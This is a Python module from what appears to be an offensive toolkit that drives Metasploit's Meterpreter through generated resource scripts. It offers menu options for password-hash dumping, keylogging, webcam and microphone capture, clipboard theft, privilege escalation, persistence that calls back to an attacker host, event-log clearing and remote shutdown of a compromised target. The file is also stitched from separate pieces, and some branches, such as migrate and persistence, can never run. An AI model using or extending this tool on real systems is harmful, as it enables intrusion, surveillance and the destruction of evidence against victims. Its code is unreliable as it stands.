
def box(title, icon="⚔️"):
    print()
    print(f"[31m[1m  ┌{'─'*46}┐[0m")
    print(f"[31m[1m  │[0m  [32m[1m{icon}  [33m[1m{title}[0m  [31m[1m{' '*(43-len(title))}[0m")
    print(f"[31m[1m  └{'─'*46}┘[0m")
    print()

section_header = box

def move_to_sdcard(filepath):
    if not os.path.exists(filepath):
        return False
    for sd in ["/sdcard", "/storage/emulated/0"]:
        if os.path.exists(sd):
            dest = os.path.join(sd, os.path.basename(filepath))
            try:
                import shutil as _sh
                _sh.copy2(filepath, dest)
                print(f"  [32m[1m  ✅ Moved to {dest}[0m")
                return True
            except:
                pass
    print(f"  [36m[1m  ➜ {filepath}[0m")
    return False
#!/usr/bin/env python3
"""Meterpreter Commands Module"""

import os
import sys
import shutil
import subprocess

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "colorama", "--break-system-packages"], capture_output=True)
    from colorama import Fore, Style, init
    init(autoreset=True)

R, G, Y, B, M, C, W = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE
D, BRIGHT, RESET = Style.DIM, Style.BRIGHT, Style.RESET_ALL


# ═══════════════════════════════════════════════════════════════
#  TOOL DETECTOR (same as main.py)
# ═══════════════════════════════════════════════════════════════

MSF_PATHS = [
    os.path.expanduser("~/metasploit-framework/msfconsole"),
    "/opt/metasploit-framework/bin/msfconsole",
    "/usr/bin/msfconsole",
    "/usr/local/bin/msfconsole",
    shutil.which("msfconsole") or "",
]

def find_tool(name):
    path = shutil.which(name)
    if path:
        return path
    common = {
        "msfconsole": MSF_PATHS,
        "msfvenom": ["~/metasploit-framework/msfvenom", "/opt/metasploit-framework/bin/msfvenom", "/usr/bin/msfvenom"],
        "nmap": ["/usr/bin/nmap"],
        "sqlmap": ["/usr/bin/sqlmap", "/usr/share/sqlmap/sqlmap.py"],
        "hydra": ["/usr/bin/hydra"],
        "john": ["/usr/bin/john"],
        "nikto": ["/usr/bin/nikto"],
        "gobuster": ["/usr/bin/gobuster"],
        "dirb": ["/usr/bin/dirb"],
    }
    for p in common.get(name, []):
        if p and os.path.exists(p):
            return p
    return None

def get_msf_path():
    return find_tool("msfconsole") or "msfconsole"

def get_msfvenom_path():
    return find_tool("msfvenom") or "msfvenom"

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def info(msg):
    print(f"  {C}{BRIGHT}  ℹ️  ➤ {msg}{RESET}")

def success(msg):
    print(f"  {G}{BRIGHT}  ✅ ✔ {msg}{RESET}")

def error(msg):
    print(f"  {R}{BRIGHT}  ❌ ✘ {msg}{RESET}")

def cmd_result(label, value):
    print(f"  {M}{BRIGHT}  ◆ {B}{label}:{RESET} {G}{BRIGHT}{value}{RESET}")

def get_ip(prompt, default=""):
    val = input(f"  {C}{BRIGHT}{prompt}{RESET}").strip()
    return val if val else default

def box_alias(title, icon="🎮"):
    print()
    print(f"{R}{BRIGHT}  ╔════════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{R}{BRIGHT}  ║{RESET}  {G}{BRIGHT}  {icon}  {Y}{BRIGHT}{title}{RESET}  {R}{BRIGHT}{' '*(63-len(title))}║{RESET}")
    print(f"{R}{BRIGHT}  ╚════════════════════════════════════════════════════════════════════════╝{RESET}")
    print()

def generate_rc_and_run(commands, name="meterpreter"):
    rc_file = f"/tmp/{name}.rc"
    with open(rc_file, 'w') as f:
        for cmd in commands:
            f.write(cmd + "\n")
    info(f"Generated: {rc_file}")
    os.system(f"{get_msf_path()} -r {rc_file}")

def meterpreter_menu():
    section_header("METERPRETER COMMANDS", "🎮")
    
    print(f"""
  {Y}═══ SYSTEM INFO ═══{RESET}
  {M}[1]{RESET}   {G}System Info (sysinfo){RESET}
  {M}[2]{RESET}   {G}Get User ID (getuid){RESET}
  {M}[3]{RESET}   {G}Get Privileges (getprivs){RESET}
  {M}[4]{RESET}   {G}Get PID (getpid){RESET}
  {M}[5]{RESET}   {G}Get Process List (ps){RESET}
  {M}[6]{RESET}   {G}Get Network Interfaces{RESET}
  {M}[7]{RESET}   {G}Get Route Table{RESET}
  {M}[8]{RESET}   {G}Get ARP Table{RESET}
  {M}[9]{RESET}   {G}Get DNS Cache{RESET}
  {M}[10]{RESET}  {G}Get Environment Variables{RESET}
  {M}[11]{RESET}  {G}Get Current Directory{RESET}
  {M}[12]{RESET}  {G}List Drives{RESET}
  ─────────────────────────────────
  {Y}═══ CREDENTIAL ACCESS ═══{RESET}
  {M}[13]{RESET}  {G}Hash Dump (hashdump){RESET}
  {M}[14]{RESET}  {G}Mimikatz (load mimikatz){RESET}
  {M}[15]{RESET}  {G}Dump Credentials (creds){RESET}
  {M}[16]{RESET}  {G}Keylogger Start (keyscan_start){RESET}
  {M}[17]{RESET}  {G}Keylogger Dump (keyscan_dump){RESET}
  {M}[18]{RESET}  {G}Keylogger Stop (keyscan_stop){RESET}
  {M}[19]{RESET}  {G}Screenshot (screenshot){RESET}
  {M}[20]{RESET}  {G}Webcam Snap (webcam_snap){RESET}
  {M}[21]{RESET}  {G}Record Mic (record_mic){RESET}
  {M}[22]{RESET}  {G}Dump Wi-Fi Profiles{RESET}
  {M}[23]{RESET}  {G}Clipboard Dump{RESET}
  ─────────────────────────────────
  {Y}═══ FILE OPERATIONS ═══{RESET}
  {M}[24]{RESET}  {G}List Files (ls){RESET}
  {M}[25]{RESET}  {G}Change Directory (cd){RESET}
  {M}[26]{RESET}  {G}Download File{RESET}
  {M}[27]{RESET}  {G}Upload File{RESET}
  {M}[28]{RESET}  {G}Delete File{RESET}
  {M}[29]{RESET}  {G}Search Files (search){RESET}
  {M}[30]{RESET}  {G}Edit File (edit){RESET}
  {M}[31]{RESET}  {G}Show File Contents (cat){RESET}
  {M}[32]{RESET}  {G}Make Directory (mkdir){RESET}
  {M}[33]{RESET}  {G}Rename File (mv){RESET}
  ─────────────────────────────────
  {Y}═══ PROCESS OPERATIONS ═══{RESET}
  {M}[34]{RESET}  {G}Kill Process (kill){RESET}
  {M}[35]{RESET}  {G}Migrate to Process (migrate){RESET}
  {M}[36]{RESET}  {G}Execute Program (execute){RESET}
  {M}[37]{RESET}  {G}Execute Shell Command{RESET}
  {M}[38]{RESET}  {G}Execute & Inject (execute -i -H){RESET}
  {M}[39]{RESET}  {G}Process List (ps){RESET}
  ─────────────────────────────────
  {Y}═══ PRIVILEGE ESCALATION ═══{RESET}
  {M}[40]{RESET}  {G}Get System (getsystem){RESET}
  {M}[41]{RESET}  {G}Get Privileges (getprivs){RESET}
  {M}[42]{RESET}  {G}Bypass UAC (bypassuac){RESET}
  {M}[43]{RESET}  {G}Enable All Privileges{RESET}
  ─────────────────────────────────
  {Y}═══ PERSISTENCE ═══{RESET}
  {M}[44]{RESET}  {G}Persistence (registry){RESET}
  {M}[45]{RESET}  {G}Persistence (service){RESET}
  {M}[46]{RESET}  {G}Persistence (scheduled task){RESET}
  {M}[47]{RESET}  {G}Persistence (metsvc){RESET}
  {M}[48]{RESET}  {G}Persistence (extapi_schtasks){RESET}
  ─────────────────────────────────
  {Y}═══ NETWORK ═══{RESET}
  {M}[49]{RESET}  {G}Port Forward (portfwd){RESET}
  {M}[50]{RESET}  {G}Add Route (autoroute){RESET}
  {M}[51]{RESET}  {G}ARP Scan Local Network{RESET}
  {M}[52]{RESET}  {G}Netstat (netstat){RESET}
  {M}[53]{RESET}  {G}DNS Lookup{RESET}
  {M}[54]{RESET}  {G}Traceroute{RESET}
  ─────────────────────────────────
  {Y}═══ ANTI-FORENSICS ═══{RESET}
  {M}[55]{RESET}  {G}Clear Event Logs (clearev){RESET}
  {M}[56]{RESET}  {G}Timestomp (timestomp){RESET}
  {M}[57]{RESET}  {G}Delete Files (shred){RESET}
  {M}[58]{RESET}  {G}Unlink (unlink){RESET}
  {M}[59]{RESET}  {G}Stealth Mode{RESET}
  ─────────────────────────────────
  {Y}═══ SESSION MANAGEMENT ═══{RESET}
  {M}[60]{RESET}  {G}List Sessions{RESET}
  {M}[61]{RESET}  {G}Interact Session{RESET}
  {M}[62]{RESET}  {G}Background Session{RESET}
  {M}[63]{RESET}  {G}Kill Session{RESET}
  {M}[64]{RESET}  {G}Upgrade Shell to Meterpreter{RESET}
  ─────────────────────────────────
  {Y}═══ MISC ═══{RESET}
  {M}[65]{RESET}  {G}Shell (drop to cmd/bash){RESET}
  {M}[66]{RESET}  {G}Reboot Target{RESET}
  {M}[67]{RESET}  {G}Shutdown Target{RESET}
  {M}[68]{RESET}  {G}Sleep (hibernate){RESET}
  {M}[69]{RESET}  {G}Resource Script Execute{RESET}
  {M}[70]{RESET}  {G}Custom Meterpreter Command{RESET}
  {M}[0]{RESET}   {R}🔙 Back{RESET}
""")
    
    choice = input(f"  {C}{BRIGHT}Choose [0-70]: {RESET}").strip()
    if choice == "0":
        return
    
    session_id = get_ip("Meterpreter Session ID: ", "1")
    
    mpcmd_map = {
        "1": "sysinfo",
        "2": "getuid",
        "3": "getprivs",
        "4": "getpid",
        "5": "ps",
        "6": "ifconfig",
        "7": "route",
        "8": "arp",
        "9": "ipconfig /displaydns",
        "10": "environ",
        "11": "pwd",
        "12": "drives",
        "13": "hashdump",
        "16": "keyscan_start",
        "17": "keyscan_dump",
        "18": "keyscan_stop",
        "19": "screenshot",
        "20": "webcam_snap",
        "21": "record_mic -d 10",
        "22": "run wifi_list_profiles",
        "23": "clipboard_dump",
        "24": "ls",
        "27": "download",
        "28": "del",
        "29": "search",
        "34": "kill",
        "37": "shell",
        "40": "getsystem",
        "41": "getprivs",
        "52": "netstat",
        "55": "clearev",
        "65": "shell",
        "66": "reboot",
        "67": "shutdown",
        "68": "sleep 300",
    }
    
    if choice in mpcmd_map:
        cmd = mpcmd_map[choice]
        if choice in ["27", "28", "34"]:
            cmd_arg = get_ip(f"Argument for {cmd}: ", "")
            cmd = f"{cmd} {cmd_arg}"
        elif choice == "35":
            pid = get_ip("PID to migrate to: ", "0")
            cmd = f"migrate {pid}"
        elif choice == "36":
            exe = get_ip("Executable path: ", "C:\\Windows\\System32\\cmd.exe")
            cmd = f"execute -f {exe} -i -H"
        elif choice in ["44", "45", "46", "47"]:
            lhost = get_ip("LHOST: ", "0.0.0.0")
            lport = get_ip("LPORT: ", "4444")
            cmd = f"run persistence -U -i 5 -p {lport} -r {lhost}"
        
        cmds = [f"sessions -i {session_id}", cmd, "background"]
        generate_rc_and_run(cmds, f"mpcmd_{choice}")
    
    elif choice in ["39", "60", "61", "62", "63", "64"]:
        session_cmds = {
            "39": "ps",
            "60": "sessions -l",
            "61": f"sessions -i {session_id}",
            "62": "background",
            "63": f"sessions -k {session_id}",
            "64": "sessions -u",
        }
        cmds = [session_cmds[choice]]
        generate_rc_and_run(cmds, f"session_{choice}")
    
    elif choice == "70":
        cmd = input(f"  {C}{BRIGHT}Custom command: {RESET}").strip()
        if cmd:
            cmds = [f"sessions -i {session_id}", cmd, "background"]
            generate_rc_and_run(cmds, "mpcmd_custom")
